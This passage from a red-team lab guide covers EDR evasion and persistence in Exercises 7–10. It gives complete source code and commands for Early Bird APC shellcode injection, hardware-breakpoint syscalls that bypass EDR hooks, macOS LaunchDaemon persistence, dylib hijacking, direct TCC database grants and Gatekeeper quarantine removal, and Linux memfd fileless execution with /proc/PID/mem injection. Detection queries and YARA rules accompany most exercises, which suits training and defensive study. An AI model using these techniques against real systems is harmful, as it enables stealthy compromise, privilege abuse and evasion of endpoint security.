windows-target> taskkill /F /IM cmd.exe 2>nul
windows-target> rd /S /Q C:\lab\ex06_ppid
```

---

### Exercise 7 — Early Bird APC Injection

**Objective.** Inject shellcode into a suspended process before EDR hooks are installed by queueing an APC to the main thread before it is resumed (`NtQueueApcThread` + `CREATE_SUSPENDED`).

**MITRE ATT&CK.** T1055.004 — Process Injection: Asynchronous Procedure Call.

**Background.** When an EDR injects its DLL into a new process, it typically does so via an `NtCreateThreadEx`-based image-load callback fired during `NtResumeThread`. If the attacker queues an APC *before* `NtResumeThread`, the APC executes before the EDR's thread context is established — the hooks that would catch `NtAllocateVirtualMemory` and `NtWriteVirtualMemory` in the child haven't been installed yet.

**Source code (`early_bird.c`)**
```c
/*
 * early_bird.c — Early Bird APC Injection
 * Compile: cl.exe /W3 /O2 early_bird.c /link /out:early_bird.exe
 */
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3);

/* Minimal shellcode: MessageBox then ExitThread (x64) for lab demo */
/* In a real engagement this would be Cobalt Strike / Havoc beacon shellcode */
static const BYTE g_Shellcode[] = {
    /* sub rsp, 0x28 (shadow space) */
    0x48, 0x83, 0xEC, 0x28,
    /* xor ecx, ecx */
    0x31, 0xC9,
    /* xor edx, edx */
    0x31, 0xD2,
    /* xor r8d, r8d */
    0x45, 0x31, 0xC0,
    /* push 0 (uType) */
    0x6A, 0x00,
    /* call ExitThread (simplified — real shellcode would resolve via PEB walk) */
    /* nop sled for demo */
    0x90, 0x90, 0x90, 0x90,
    /* add rsp, 0x28 */
    0x48, 0x83, 0xC4, 0x28,
    /* ret */
    0xC3
};

BOOL EarlyBirdInject(LPCSTR targetExe, const BYTE *shellcode, SIZE_T scSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    /* Create target process suspended */
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcessA(%s) failed: %lu\n", targetExe, GetLastError());
        return FALSE;
    }
    printf("[+] Created suspended: %s PID=%lu TID=%lu\n",
           targetExe, pi.dwProcessId, pi.dwThreadId);

    /* Allocate RWX memory in child — before EDR hooks are active */
    PVOID remoteBase = NULL;
    SIZE_T regionSize = scSize;
    HANDLE hProc = pi.hProcess;

    remoteBase = VirtualAllocEx(hProc, NULL, regionSize,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        fprintf(stderr, "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(hProc, 1);
        CloseHandle(pi.hThread); CloseHandle(hProc);
        return FALSE;
    }
    printf("[*] Allocated %zu bytes at %p in child\n", regionSize, remoteBase);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteBase, shellcode, scSize, &written)) {
        fprintf(stderr, "[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(hProc, 1);
        CloseHandle(pi.hThread); CloseHandle(hProc);
        return FALSE;
    }
    printf("[*] Wrote %zu bytes of shellcode\n", written);

    /* Queue APC to main thread BEFORE resume — fires before EDR DLL loads */
    pNtQueueApcThread NtQueueApc = (pNtQueueApcThread)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    if (!NtQueueApc) {
        fprintf(stderr, "[-] Could not resolve NtQueueApcThread\n");
        VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(hProc, 1);
        CloseHandle(pi.hThread); CloseHandle(hProc);
        return FALSE;
    }

    NTSTATUS status = NtQueueApc(pi.hThread,
                                  (PVOID)remoteBase,
                                  NULL, NULL, NULL);
    if (status != 0) {
        fprintf(stderr, "[-] NtQueueApcThread failed: 0x%08lX\n", status);
        VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(hProc, 1);
        CloseHandle(pi.hThread); CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] APC queued to TID=%lu at %p\n", pi.dwThreadId, remoteBase);

    /* Resume thread — APC fires before EDR image-load callback */
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed — shellcode executing before EDR hooks installed\n");

    WaitForSingleObject(hProc, 3000);
    CloseHandle(pi.hThread);
    CloseHandle(hProc);
    return TRUE;
}

int main(void) {
    printf("=== Early Bird APC Injection ===\n\n");
    EarlyBirdInject("C:\\Windows\\System32\\notepad.exe",
                    g_Shellcode, sizeof(g_Shellcode));
    return 0;
}
```

**Step 3 — Compile and run**
```
windows-target> cl.exe /W3 /O2 C:\lab\ex07_earlybird\early_bird.c ^
    /link /out:C:\lab\ex07_earlybird\early_bird.exe
windows-target> C:\lab\ex07_earlybird\early_bird.exe
```

**Expected output**
```
=== Early Bird APC Injection ===

[+] Created suspended: C:\Windows\System32\notepad.exe PID=5432 TID=5436
[*] Allocated 24 bytes at 0x0000023F10000000 in child
[*] Wrote 24 bytes of shellcode
[+] APC queued to TID=5436 at 0x0000023F10000000
[+] Thread resumed — shellcode executing before EDR hooks installed
```

**Detection Verification**
```powershell
# Early Bird leaves a distinctive trace: process created suspended, then VirtualAllocEx
# + WriteProcessMemory + NtQueueApcThread all before ResumeThread
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 8 -and $_.Message -like "*notepad*" } |
    Select-Object TimeCreated, Message -First 5

# Sysmon Event 8 = CreateRemoteThread (APC queuing shows similarly)
# ETW: NtQueueApcThread on CREATE_SUSPENDED process before NtResumeThread
# Key detection gap: hooks not yet active at APC fire time
```

**YARA Rule**
```yara
rule Early_Bird_APC_Injection {
    meta:
        description = "Early Bird APC injection: CREATE_SUSPENDED + NtQueueApcThread before resume"
        mitre = "T1055.004"
        severity = "critical"
    strings:
        $ntqueueapc   = "NtQueueApcThread" ascii
        $create_susp  = { 04 00 00 00 }  /* CREATE_SUSPENDED flag */
        $virtualalloc = "VirtualAllocEx" ascii
        $writeprocmem = "WriteProcessMemory" ascii
    condition:
        uint16(0) == 0x5A4D and
        $ntqueueapc and $virtualalloc and $writeprocmem
}
```

**Cleanup**
```
windows-target> taskkill /F /IM notepad.exe 2>nul
windows-target> taskkill /F /IM early_bird.exe 2>nul
windows-target> rd /S /Q C:\lab\ex07_earlybird
```

---

### Exercise 8 — Hardware Breakpoint Syscall Invocation

**Objective.** Use Vectored Exception Handling (VEH) with hardware debug registers (DR0) to intercept execution at a syscall stub and redirect to a clean syscall gadget, bypassing both user-mode hooks and call-stack analysis.

**MITRE ATT&CK.** T1106 — Native API; T1562.001 — Impair Defenses.

**Background.** Hardware breakpoints use CPU debug registers (DR0–DR3) to fire a `EXCEPTION_SINGLE_STEP` exception when execution reaches a specific address — without modifying any code bytes. A VEH handler catches the exception, inspects DR6 to identify which breakpoint fired, sets up the SSN in RAX and the correct calling convention in R10, then redirects RIP to a `syscall;ret` gadget in ntdll. The EDR sees no code patch, no `VirtualProtect` call, and the call stack frames are from legitimate ntdll code.

**Source code (`hwbp_syscall.c`)**
```c
/*
 * hwbp_syscall.c — Hardware Breakpoint VEH syscall invocation
 * Compile: cl.exe /W3 /O2 hwbp_syscall.c /link /out:hwbp_syscall.exe
 */
#include <windows.h>
#include <stdio.h>

typedef struct _HWBP_SYSCALL {
    DWORD ssn;
    PVOID syscall_ret_addr;  /* gadget: syscall;ret in ntdll */
    PVOID fn_addr;           /* address of the hooked ntdll function */
} HWBP_SYSCALL;

static HWBP_SYSCALL g_NtAllocVM = {0};

/* Find syscall;ret gadget in ntdll .text */
static PVOID FindGadget(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)h + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(s[i].Name, ".text", 5) == 0) {
            PBYTE base = (PBYTE)h + s[i].VirtualAddress;
            DWORD sz = s[i].Misc.VirtualSize;
            for (DWORD j = 0; j < sz - 2; j++) {
                if (base[j] == 0x0F && base[j+1] == 0x05 && base[j+2] == 0xC3)
                    return (PVOID)(base + j);
            }
        }
    }
    return NULL;
}

/* Resolve SSN via EAT sort (SysWhispers2 method — address order = SSN order) */
static DWORD ResolveSSN_EATSort(const char *targetName) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)h + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)
        ((PBYTE)h + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    PDWORD names   = (PDWORD)((PBYTE)h + exp->AddressOfNames);
    PWORD  ordinals = (PWORD)((PBYTE)h + exp->AddressOfNameOrdinals);
    PDWORD funcs   = (PDWORD)((PBYTE)h + exp->AddressOfFunctions);

    /* Collect all Zw* functions and sort by address */
    typedef struct { PVOID addr; const char *name; } FnEntry;
    static FnEntry table[512]; int count = 0;
    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        const char *name = (const char *)((PBYTE)h + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            table[count].addr = (PVOID)((PBYTE)h + funcs[ordinals[i]]);
            table[count].name = name;
            count++;
        }
    }
    /* Bubble sort by address (address order = SSN order) */
    for (int i = 0; i < count - 1; i++)
        for (int j = 0; j < count - 1 - i; j++)
            if ((ULONG_PTR)table[j].addr > (ULONG_PTR)table[j+1].addr) {
                FnEntry tmp = table[j]; table[j] = table[j+1]; table[j+1] = tmp;
            }
    /* Target function name with Zw prefix */
    char zwName[64];
    snprintf(zwName, sizeof(zwName), "Zw%s", targetName + 2);  /* NtXxx → ZwXxx */
    for (int i = 0; i < count; i++) {
        if (strcmp(table[i].name, zwName) == 0) return (DWORD)i;
    }
    return (DWORD)-1;
}

/* VEH handler: fires on DR0 hardware breakpoint */
static LONG CALLBACK HwBpHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Check if DR6 bit 0 is set (DR0 fired) */
    if (!(pExInfo->ContextRecord->Dr6 & 0x1))
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = pExInfo->ContextRecord;
    /* Set up syscall arguments as per Windows x64 ABI:
     * R10 = first arg (rcx was set by caller)
     * RAX = SSN */
    ctx->Rax = (DWORD64)g_NtAllocVM.ssn;
    ctx->R10 = ctx->Rcx;   /* move first arg from RCX to R10 */
    ctx->Rip = (DWORD64)g_NtAllocVM.syscall_ret_addr;

    /* Clear breakpoint */
    ctx->Dr0 = 0;
    ctx->Dr6 = 0;
    ctx->Dr7 &= ~(DWORD64)0x1;  /* disable DR0 */

    return EXCEPTION_CONTINUE_EXECUTION;
}

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

int main(void) {
    printf("=== Hardware Breakpoint VEH Syscall Demo ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    g_NtAllocVM.fn_addr = (PVOID)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    g_NtAllocVM.ssn = ResolveSSN_EATSort("NtAllocateVirtualMemory");
    g_NtAllocVM.syscall_ret_addr = FindGadget();

    if (g_NtAllocVM.ssn == (DWORD)-1 || !g_NtAllocVM.syscall_ret_addr) {
        fprintf(stderr, "[-] Failed to resolve SSN or gadget\n");
        return 1;
    }
    printf("[+] NtAllocateVirtualMemory: SSN=0x%04lX gadget=%p fn=%p\n",
           g_NtAllocVM.ssn, g_NtAllocVM.syscall_ret_addr, g_NtAllocVM.fn_addr);

    /* Register VEH */
    PVOID hVeh = AddVectoredExceptionHandler(1, HwBpHandler);
    if (!hVeh) { fprintf(stderr, "[-] AddVectoredExceptionHandler failed\n"); return 1; }
    printf("[+] VEH registered\n");

    /* Set DR0 to NtAllocateVirtualMemory address via NtSetContextThread on current thread */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)g_NtAllocVM.fn_addr;
    ctx.Dr7 = 0x1;  /* enable DR0 local (bits 0-1) */
    SetThreadContext(GetCurrentThread(), &ctx);
    printf("[+] Hardware breakpoint set at NtAllocateVirtualMemory (%p)\n",
           g_NtAllocVM.fn_addr);

    /* Call NtAllocateVirtualMemory — will trigger DR0, VEH handler redirects to gadget */
    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)g_NtAllocVM.fn_addr;
    PVOID base = NULL; SIZE_T sz = 0x1000;
    NTSTATUS status = NtAlloc(GetCurrentProcess(), &base, 0, &sz,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[%s] NtAllocateVirtualMemory via HWBP: status=0x%08lX base=%p\n",
           status == 0 ? "+" : "-", status, base);

    if (base) VirtualFree(base, 0, MEM_RELEASE);
    RemoveVectoredExceptionHandler(hVeh);
    printf("[+] Demo complete.\n");
    return 0;
}
```

**Compile and run**
```
windows-target> cl.exe /W3 /O2 C:\lab\ex08_hwbp\hwbp_syscall.c ^
    /link /out:C:\lab\ex08_hwbp\hwbp_syscall.exe
windows-target> C:\lab\ex08_hwbp\hwbp_syscall.exe
```

**Expected output**
```
=== Hardware Breakpoint VEH Syscall Demo ===

[+] NtAllocateVirtualMemory: SSN=0x0018 gadget=0x7FFEA3B21234 fn=0x7FFEA3A00890
[+] VEH registered
[+] Hardware breakpoint set at NtAllocateVirtualMemory (0x7FFEA3A00890)
[+] NtAllocateVirtualMemory via HWBP: status=0x00000000 base=0x0000020000010000
[+] Demo complete.
```

**Detection Verification**
```powershell
# HWBP technique leaves no code patches — hardest to detect at rest
# Detection relies on:
# 1. NtSetContextThread calls that set DR0-DR3 in non-debugging contexts
# 2. AddVectoredExceptionHandler followed by debug register use
# 3. ETW: EXCEPTION_SINGLE_STEP events in non-debugger contexts are suspicious
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 10 } |
    Select-Object TimeCreated, Message -First 5
```

**Cleanup**
```
windows-target> taskkill /F /IM hwbp_syscall.exe 2>nul
windows-target> rd /S /Q C:\lab\ex08_hwbp
```

---

### Exercise 9 — macOS Persistence and TCC Bypass

**Objective.** Install a LaunchDaemon for root persistence, create a dylib proxy for hijacking, directly manipulate the TCC database to grant Accessibility access, and evade XProtect quarantine attributes.

**MITRE ATT&CK.** T1543.004 — Create or Modify System Process: Launch Daemon; T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking; T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid; T1553.001 — Subvert Trust Controls: Gatekeeper Bypass.

---

**Step 1 — LaunchDaemon persistence**

```bash
# macos-lab: create a LaunchDaemon plist for root-level persistence
sudo tee /Library/LaunchDaemons/com.lab.persistd.plist > /dev/null << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.lab.persistd</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/lab_implant</string>
        <string>--beacon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/lab_implant.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/lab_implant_err.log</string>
</dict>
</plist>
EOF

sudo chown root:wheel /Library/LaunchDaemons/com.lab.persistd.plist
sudo chmod 644 /Library/LaunchDaemons/com.lab.persistd.plist

# Verify plist syntax
plutil -lint /Library/LaunchDaemons/com.lab.persistd.plist

# Load the daemon (will fail if /usr/local/bin/lab_implant doesn't exist — expected in lab)
sudo launchctl bootstrap system /Library/LaunchDaemons/com.lab.persistd.plist
launchctl list | grep lab.persist
```

**Detection for LaunchDaemon**
```bash
# List all third-party LaunchDaemons (non-Apple)
sudo ls -la /Library/LaunchDaemons/ | grep -v "com.apple"

# Check with osquery
osqueryi "SELECT name, path, run_at_load, keep_alive FROM launchd WHERE path LIKE '/Library/LaunchDaemons/%';"

# Falco equivalent rule (macOS ESF):
# Suspicious LaunchDaemon creation by non-system process
```

---

**Step 2 — dylib hijacking via @rpath**

```c
/* proxy_dylib.c — dylib proxy/hijack stub
 * Compile: clang -dynamiclib \
 *   -Wl,-reexport_library,/usr/lib/libsqlite3.dylib \
 *   -install_name @rpath/libsqlite3.dylib \
 *   -o /tmp/evil_libsqlite3.dylib proxy_dylib.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* Constructor runs before main() of the loading process */
__attribute__((constructor))
static void implant_init(void) {
    /* Fork to avoid blocking the legitimate application */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: detach and run payload */
        setsid();
        /* Write persistence marker for lab demo */
        FILE *f = fopen("/tmp/dylib_hijack_triggered.txt", "w");
        if (f) {
            fprintf(f, "dylib hijack executed by PID=%d PPID=%d\n",
                    getpid(), getppid());
            fclose(f);
        }
        _exit(0);
    }
    /* Parent continues loading the legitimate application normally */
}

/* All symbols are re-exported from the real dylib via -reexport_library */
```

```bash
# Compile the proxy dylib
clang -dynamiclib \
    -Wl,-reexport_library,/usr/lib/libsqlite3.dylib \
    -install_name @rpath/libsqlite3.dylib \
    -o /tmp/evil_libsqlite3.dylib /tmp/proxy_dylib.c

# Find an application with a vulnerable @rpath
# Look for binaries that have @rpath in their dylib load commands
# and where we can write to a directory in their rpath list
otool -l /Applications/SomeApp.app/Contents/MacOS/SomeApp | grep -A2 RPATH

# Place the evil dylib in a writable rpath directory
cp /tmp/evil_libsqlite3.dylib ~/Library/Frameworks/libsqlite3.dylib

# When SomeApp launches, it searches @rpath and finds our evil dylib first
```

---

**Step 3 — TCC database direct manipulation**

```python
#!/usr/bin/env python3
"""
tcc_bypass.py — Direct TCC.db manipulation
Requires: SIP disabled in lab VM, or FDA (Full Disk Access) via other means
Run as root on macos-lab
"""
import sqlite3
import os
import sys
import time

TCC_DB_PATH = "/Library/Application Support/com.apple.TCC/TCC.db"
# User-level TCC DB (for non-protected services):
USER_TCC_DB = os.path.expanduser(
    "~/Library/Application Support/com.apple.TCC/TCC.db"
)

def grant_tcc_access(db_path, bundle_id, service="kTCCServiceAccessibility"):
    """Insert or replace a TCC allow entry for the given bundle_id."""
    if not os.path.exists(db_path):
        print(f"[-] TCC database not found: {db_path}")
        sys.exit(1)

    # On macOS 12+, TCC.db is locked by tccd — stop it first (root required)
    os.system("launchctl stop com.apple.tccd")
    time.sleep(0.5)

    conn = sqlite3.connect(db_path)
    try:
        # Schema: service, client, client_type, auth_value, auth_reason, auth_version,
        #         csreq, policy_id, indirect_object_identifier_type,
        #         indirect_object_identifier, indirect_object_code_identity,
        #         flags, last_modified
        conn.execute("""
            INSERT OR REPLACE INTO access
            (service, client, client_type, auth_value, auth_reason, auth_version,
             csreq, policy_id, indirect_object_identifier_type,
             indirect_object_identifier, indirect_object_code_identity,
             flags, last_modified)
            VALUES (?, ?, 0, 2, 3, 1, NULL, NULL, 0, 'UNUSED', NULL, 0, strftime('%s','now'))
        """, (service, bundle_id))
        conn.commit()
        print(f"[+] Granted {service} to {bundle_id}")
    except sqlite3.OperationalError as e:
        print(f"[-] DB error: {e}")
    finally:
        conn.close()

    # Restart tccd to pick up changes
    os.system("launchctl start com.apple.tccd")

def query_tcc_entries(db_path):
    """List current TCC entries."""
    conn = sqlite3.connect(db_path)
    rows = conn.execute(
        "SELECT service, client, auth_value FROM access ORDER BY service, client"
    ).fetchall()
    conn.close()
    return rows

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Must run as root for system TCC.db")
        sys.exit(1)

    print("=== TCC Database Manipulation Demo ===\n")
    print("[*] Current TCC entries:")
    for row in query_tcc_entries(TCC_DB_PATH):
        print(f"    {row[0]:<50} {row[1]:<40} auth={row[2]}")

    # Grant Accessibility access to our lab implant bundle ID
    grant_tcc_access(TCC_DB_PATH, "com.lab.evasion-implant",
                     "kTCCServiceAccessibility")
    # Grant Full Disk Access
    grant_tcc_access(TCC_DB_PATH, "com.lab.evasion-implant",
                     "kTCCServiceSystemPolicyAllFiles")

    print("\n[*] Updated TCC entries:")
    for row in query_tcc_entries(TCC_DB_PATH):
        if "lab" in row[1]:
            print(f"    [+] {row[0]:<50} {row[1]:<40} auth={row[2]}")
```

```bash
# Run TCC bypass
sudo python3 /tmp/tcc_bypass.py

# Verify entry was inserted
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT service, client, auth_value FROM access WHERE client LIKE '%lab%';"
```

---

**Step 4 — Remove quarantine attribute to bypass Gatekeeper**

```bash
# Files downloaded from the internet get com.apple.quarantine xattr
# Remove it to bypass Gatekeeper check
xattr -l /tmp/lab_implant_unsigned.app
# Output: com.apple.quarantine: 0083;65a0e1c3;Safari;12345678-ABCD

# Remove quarantine xattr — Gatekeeper will not prompt or block
xattr -d com.apple.quarantine /tmp/lab_implant_unsigned.app

# Verify removal
xattr -l /tmp/lab_implant_unsigned.app  # should show no quarantine

# Alternative: set quarantine flag to 0 (still present but skipped)
xattr -w com.apple.quarantine "00c1;00000000;;" /tmp/lab_implant_unsigned.app
```

**Detection Verification (macOS)**
```bash
# On macos-lab: check Unified Log for TCC events
log stream --predicate 'subsystem == "com.apple.TCC"' --level debug &

# Query launchd for persistence entries
osqueryi "SELECT name, path, run_at_load FROM launchd WHERE name LIKE '%lab%';"

# Check for quarantine bypass
mdfind "kMDItemQuarantine == ''" -onlyin /Applications

# ESF (Endpoint Security Framework) consumer would see:
# ES_EVENT_TYPE_NOTIFY_WRITE on TCC.db
# ES_EVENT_TYPE_NOTIFY_EXEC for the dylib-loading process
```

**YARA Rule (macOS dylib proxy)**
```yara
rule macOS_Dylib_Proxy_Implant {
    meta:
        description = "macOS dylib with constructor and fork/setsid pattern (proxy hijack)"
        mitre = "T1574.006"
        severity = "high"
        platform = "macos"
    strings:
        $constructor = "__attribute__((constructor))" ascii
        $setsid      = "setsid" ascii
        $fork_call   = { E8 ?? ?? ?? ?? 85 C0 }  /* call fork; test eax, eax */
        $reexport    = "-reexport_library" ascii
        $implant_fn  = "implant_init" ascii
    condition:
        ($constructor or $implant_fn) and ($setsid or $fork_call)
}
```

**Cleanup**
```bash
# macos-lab cleanup
sudo launchctl bootout system /Library/LaunchDaemons/com.lab.persistd.plist 2>/dev/null
sudo rm -f /Library/LaunchDaemons/com.lab.persistd.plist
sudo python3 -c "
import sqlite3
conn = sqlite3.connect('/Library/Application Support/com.apple.TCC/TCC.db')
conn.execute(\"DELETE FROM access WHERE client LIKE '%lab%'\")
conn.commit(); conn.close()
print('[+] TCC entries removed')
"
rm -f /tmp/evil_libsqlite3.dylib /tmp/dylib_hijack_triggered.txt
rm -f /tmp/tcc_bypass.py /tmp/proxy_dylib.c
```

---

### Exercise 10 — Linux Fileless Execution and Process Injection

**Objective.** Execute a payload entirely in memory using `memfd_create` + `fexecve`, inject into a running process via `/proc/PID/mem` write, and verify auditd captures all relevant syscalls.

**MITRE ATT&CK.** T1620 — Reflective Code Loading; T1055.008 — Process Injection: Ptrace System Calls.

---

**Step 1 — memfd_create fileless execution**

```c
/* memfd_exec.c — fileless execution via memfd_create + fexecve
 * Compile: gcc -O2 -o memfd_exec memfd_exec.c
 * Run: ./memfd_exec < /bin/echo  (feeds a binary on stdin)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/memfd.h>

int main(int argc, char *argv[]) {
    /* Read payload from stdin */
    unsigned char *buf = NULL;
    size_t sz = 0, cap = 65536;
    buf = malloc(cap);
    if (!buf) { perror("malloc"); return 1; }

    ssize_t n;
    unsigned char tmp[4096];
    while ((n = read(STDIN_FILENO, tmp, sizeof(tmp))) > 0) {
        if (sz + (size_t)n > cap) {
            cap *= 2;
            buf = realloc(buf, cap);
            if (!buf) { perror("realloc"); return 1; }
        }
        memcpy(buf + sz, tmp, (size_t)n);
        sz += (size_t)n;
    }
    if (sz == 0) { fprintf(stderr, "[-] No input on stdin\n"); free(buf); return 1; }
    printf("[*] Read %zu bytes from stdin\n", sz);

    /* Create anonymous memory file — never appears on filesystem */
    int fd = (int)syscall(SYS_memfd_create, "worker", MFD_CLOEXEC);
    if (fd < 0) { perror("memfd_create"); free(buf); return 1; }
    printf("[*] memfd created: /proc/self/fd/%d\n", fd);

    /* Write payload into the memfd */
    size_t written = 0;
    while (written < sz) {
        ssize_t w = write(fd, buf + written, sz - written);
        if (w < 0) { perror("write to memfd"); free(buf); close(fd); return 1; }
        written += (size_t)w;
    }
    free(buf);
    printf("[*] Wrote %zu bytes to memfd\n", written);

    /* Execute the payload — /proc/self/fd/<n> is a valid exec path */
    char *exec_argv[] = { "worker", NULL };
    char *exec_envp[] = { "PATH=/usr/bin:/bin", NULL };
    fexecve(fd, exec_argv, exec_envp);

    /* fexecve only returns on error */
    perror("fexecve");
    close(fd);
    return 1;
}
```

```bash
# linux-lab: compile and test
gcc -O2 -o /tmp/memfd_exec /tmp/memfd_exec.c

# Feed /bin/echo to run in memory (no file created)
/tmp/memfd_exec <<< "" < /bin/echo
# Or: cat /bin/echo | /tmp/memfd_exec

# Verify: no new files, payload ran in memory
ls -la /proc/self/fd/  # memfd shows as anon_inode:[memfd:worker]
```

**Auditd detection**
```bash
# Check auditd caught memfd_create syscall
sudo ausearch -k fileless_exec --start recent
# Expected:
# type=SYSCALL msg=audit(...): arch=c000003e syscall=319 success=yes pid=<n>
# syscall 319 = memfd_create on x86_64
```

---

**Step 2 — /proc/PID/mem process injection**

```c
/* proc_mem_inject.c — inject shellcode via /proc/PID/mem
 * Compile: gcc -O2 -o proc_inject proc_mem_inject.c
 * Usage: ./proc_inject <target_pid>
 * Requires: same UID as target or root, PTRACE_SCOPE=0
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <errno.h>

/* Minimal x86_64 shellcode: write(1, "INJECTED\n", 9) + infinite loop */
static const unsigned char g_Shellcode[] = {
    0x48, 0x31, 0xC0,             /* xor rax, rax */
    0x48, 0x83, 0xC0, 0x01,       /* add rax, 1 (SYS_write) */
    0x48, 0x31, 0xFF,             /* xor rdi, rdi */
    0x48, 0x83, 0xC7, 0x01,       /* add rdi, 1 (stdout) */
    0x48, 0x8D, 0x35, 0x09, 0x00, 0x00, 0x00,  /* lea rsi, [rip+9] */
    0x48, 0x31, 0xD2,             /* xor rdx, rdx */
    0x48, 0x83, 0xC2, 0x09,       /* add rdx, 9 */
    0x0F, 0x05,                   /* syscall */
    0xEB, 0xFE,                   /* jmp short -2 (loop) */
    'I','N','J','E','C','T','E','D','\n'
};

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <pid>\n", argv[0]); return 1; }
    pid_t target = (pid_t)atoi(argv[1]);

    printf("[*] Target PID: %d\n", target);

    /* Attach with ptrace to get control */
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("ptrace ATTACH"); return 1;
    }
    int status;
    waitpid(target, &status, 0);
    printf("[+] Attached to PID %d\n", target);

    /* Get current registers to find RIP (code execution point) */
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, target, NULL, &regs) < 0) {
        perror("ptrace GETREGS"); ptrace(PTRACE_DETACH, target, NULL, NULL); return 1;
    }
    printf("[*] Current RIP: 0x%llx\n", regs.rip);

    /* Write shellcode to target process memory via /proc/PID/mem */
    char mempath[64];
    snprintf(mempath, sizeof(mempath), "/proc/%d/mem", target);
    int memfd = open(mempath, O_RDWR);
    if (memfd < 0) { perror("open /proc/PID/mem"); ptrace(PTRACE_DETACH, target, NULL, NULL); return 1; }

    /* Write shellcode at current RIP — overwrite whatever is there */
    /* In a real scenario: allocate new memory via PTRACE_SYSCALL injection */
    ssize_t w = pwrite(memfd, g_Shellcode, sizeof(g_Shellcode), (off_t)regs.rip);
    close(memfd);
    if (w < 0) { perror("pwrite to /proc/PID/mem"); ptrace(PTRACE_DETACH, target, NULL, NULL); return 1; }
    printf("[+] Wrote %zd bytes of shellcode at RIP=0x%llx\n", w, regs.rip);

    /* Detach — target resumes and executes our shellcode */
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    printf("[+] Detached. Target now executing shellcode.\n");
    return 0;
}
```

```bash
# linux-lab: compile
gcc -O2 -o /tmp/proc_inject /tmp/proc_mem_inject.c

# Create a harmless sleep target
sleep 999 &
TARGET_PID=$!
echo "[*] Target PID: $TARGET_PID"

# Inject (PTRACE_SCOPE must be 0 or run as root)
sudo sysctl kernel.yama.ptrace_scope=0
sudo /tmp/proc_inject $TARGET_PID
```

**Auditd and Falco detection**
```bash
# Check auditd for ptrace events
sudo ausearch -k ptrace_monitor --start recent

